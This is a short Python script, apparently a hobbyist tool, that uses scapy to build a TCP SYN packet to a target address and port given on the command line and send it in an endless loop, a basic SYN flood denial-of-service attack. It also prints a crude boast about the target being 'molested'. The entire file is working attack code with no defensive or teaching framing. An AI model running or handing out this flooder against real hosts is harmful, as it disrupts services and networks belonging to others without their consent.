from scapy.all import IP, TCP, send
import sys



# cli args
if len(sys.argv) != 3:
    print(f"Usage: python {sys.argv[0]} <target_ip> <target_port>")


target_ip = sys.argv[1]
target_port = int(sys.argv[2])

# Build SYN packet
packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")

print(f"{target_ip}:{target_port} just got molested by D-D-D-D-D-DJ Fowlerrrrrr")

# Send it
while True:
    send(packet, verbose=False)